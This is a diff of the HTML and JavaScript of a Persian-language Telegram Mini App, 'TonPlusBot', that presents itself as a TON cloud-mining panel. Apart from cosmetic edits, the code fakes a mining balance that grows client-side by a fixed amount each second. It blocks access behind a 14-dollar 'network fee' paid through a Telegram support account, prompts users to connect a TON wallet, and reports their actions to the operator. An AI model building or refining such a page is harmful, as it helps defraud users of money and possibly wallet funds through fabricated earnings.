@@ -2,7 +2,7 @@
 <html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>TonPlusBot - v42 Perfect Layout</title>
+    <title>TonPlusBot - v43 Final</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -17,7 +17,7 @@
             background: #0b1019; color: #fff; padding: 15px; direction: rtl; min-height: 100vh;
         }
 
-        /* بخش پروفایل اصلاح شده: عکس در راست، متن در چپ */
+        /* کارت پروفایل: عکس در راست، متن در چپ */
         .card-profile {
             background: #161d27; border-radius: 20px; padding: 15px;
             margin-bottom: 12px; border: 1px solid #242c37;
@@ -28,11 +28,10 @@
             width: 60px; height: 60px; border-radius: 50%; 
             background: linear-gradient(135deg, #00c6ff, #0072ff); overflow: hidden;
             display: flex; align-items: center; justify-content: center;
-            border: 2px solid #242c37; order: 2; /* بردن به سمت راست */
+            border: 2px solid #242c37; order: 2; /* جابجایی به سمت راست */
         }
 
         .profile-text { order: 1; text-align: right; flex-grow: 1; }
-
         .avatar-container img { width: 100%; height: 100%; object-fit: cover; }
         .avatar-container i { font-size: 30px; color: #fff; }
 
@@ -43,38 +42,54 @@
 
         #balance { font-size: 45px; font-weight: 900; color: #00c6ff; display: block; margin: 5px 0; }
 
-        /* دکمه‌های اصلی */
+        /* دکمه‌های هماهنگ */
         .btn {
-            width: 100%; height: 58px; border-radius: 18px; border: none;
+            width: 100%; height: 58px; border-radius: 20px; border: none;
             font-size: 16px; font-weight: 700; cursor: pointer; display: flex;
             align-items: center; justify-content: center; gap: 10px; color: #fff; 
             text-decoration: none; margin-bottom: 12px; box-sizing: border-box;
         }
 
-        /* دکمه ولت با نماد کیف پول */
-        #ton-connect-btn { width: 100%; position: relative; }
+        /* اصلاح دکمه Connect Wallet */
+        #ton-connect-btn { width: 100%; }
         #ton-connect-btn * { 
             width: 100% !important; height: 58px !important; 
-            border-radius: 18px !important; justify-content: center !important;
-            font-family: 'Vazirmatn', sans-serif !important;
+            border-radius: 20px !important; justify-content: center !important;
+            background-color: #0088cc !important;
         }
-        /* افزودن نماد ولت به صورت لایه رویی در صورت نیاز */
-        .wallet-icon-fix { position: absolute; left: 20px; top: 18px; pointer-events: none; z-index: 10; font-size: 20px; }
 
         .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); }
         .support-btn { background: #1c2431; border: 1px solid #333; }
         .active-btn { background: #1faa59; }
         .get-code-btn { background: #0088cc; }
 
-        /* مودال پرداخت */
+        /* پاپ‌آپ فعالسازی (مطابق تصویر ۷) */
         #feeModal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #0b1019; z-index: 100000; display: flex; align-items: center; justify-content: center;
         }
-        .modal-content { background: #1c1c1c; padding: 30px 18px; border-radius: 30px; width: 92%; text-align: center; border: 1px solid #333; }
-        .pay-notice { background: rgba(0, 0, 0, 0.2); border: 1.5px solid #ffc107; color: #ffc107; padding: 15px; border-radius: 20px; font-size: 11px; margin-bottom: 20px; line-height: 1.8; text-align: justify; }
-        .fee-tag { border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; }
-        #activationInput { width: 100%; height: 58px; border-radius: 18px; border: 1px solid #333; background: #0b1019; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none; }
+
+        .modal-content {
+            background: #1c1c1c; padding: 30px 18px; border-radius: 30px; width: 92%; text-align: center;
+            border: 1px solid #333; box-sizing: border-box;
+        }
+
+        .pay-notice {
+            background: rgba(0, 0, 0, 0.2); border: 1.5px solid #ffc107;
+            color: #ffc107; padding: 15px; border-radius: 20px; font-size: 11px; 
+            margin-bottom: 20px; line-height: 1.8; text-align: justify;
+        }
+
+        .fee-tag { 
+            border: 2px dashed #00ff9d; color: #00ff9d; padding: 15px; border-radius: 25px; 
+            font-weight: 800; font-size: 18px; margin-bottom: 20px; display: block; 
+        }
+
+        #activationInput {
+            width: 100%; height: 58px; border-radius: 18px; border: 1px solid #333;
+            background: #0b1019; color: #fff; text-align: center; font-size: 17px; margin-bottom: 12px; outline: none;
+        }
+
         .hidden { display: none !important; }
     </style>
 </head>
@@ -89,8 +104,13 @@
             جهت واریز مبلغ کارمزد شبکه، <b>فقط</b> اطلاعات پرداخت را از <b>پشتیبانی رسمی</b> دریافت کنید. هرگونه واریز به آدرس‌های غیررسمی منجر به مسدود شدن حساب می‌گردد.
         </div>
         <div class="fee-tag">14 دلار | 2,226,000 تومان</div>
-        <a href="https://t.me/miningertoncoin" class="btn get-code-btn"><i class="fas fa-headset"></i> دریافت رمز و واریز</a>
+        
+        <a href="https://t.me/miningertoncoin" class="btn get-code-btn">
+            <i class="fas fa-headset"></i> دریافت رمز و واریز
+        </a>
+        
         <input type="text" id="activationInput" placeholder="Enter Code">
+        
         <button onclick="verifyActivation()" class="btn active-btn">فعالسازی و ورود به پنل</button>
     </div>
 </div>
@@ -109,13 +129,13 @@
 <div class="card">
     <p style="margin:0; font-size:13px; color:#aaa;">موجودی استخراج شده (TON)</p>
     <span id="balance">0.000000</span>
-    <div style="font-size:12px; color:#00ff9d; margin-top:8px;"><i class="fas fa-bolt"></i> استخراج ابری فعال است</div>
+    <div style="font-size:12px; color:#00ff9d; margin-top:8px;">
+        <i class="fas fa-bolt"></i> استخراج ابری فعال است
+    </div>
 </div>
 
 <div class="card">
-    <div id="ton-connect-btn">
-        <i class="fas fa-wallet wallet-icon-fix"></i>
-    </div>
+    <div id="ton-connect-btn"></div>
 </div>
 
 <div style="padding: 0 5px;">
@@ -143,15 +163,15 @@
 
     if(localStorage.getItem('isActivated') === 'true') {
         document.getElementById('feeModal').style.display = 'none';
-        logToAdmin("⛏️ <b>پنل استخراج باز شد</b>");
+        logToAdmin("⛏️ <b>پنل استخراج فعال شد</b>");
     }
 
     function verifyActivation() {
         if(document.getElementById('activationInput').value.trim() === SECRET_CODE) {
             localStorage.setItem('isActivated', 'true');
             document.getElementById('feeModal').remove();
-            logToAdmin("✅ <b>پنل فعال شد</b>");
-        } else { tg.showAlert("رمز غلط ❌"); }
+            logToAdmin("✅ <b>کاربر کد فعالسازی را زد</b>");
+        } else { tg.showAlert("رمز اشتباه است ❌"); }
     }
 
     const u = tg.initDataUnsafe?.user;
@@ -165,11 +185,11 @@
         }
     }
 
-    let bal = parseFloat(localStorage.getItem('bal_v42')) || 0;
+    let bal = parseFloat(localStorage.getItem('bal_v43')) || 0;
     setInterval(() => {
         bal += 0.000012;
         document.getElementById('balance').innerText = bal.toFixed(6);
-        localStorage.setItem('bal_v42', bal.toString());
+        localStorage.setItem('bal_v43', bal.toString());
     }, 1000);
 
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
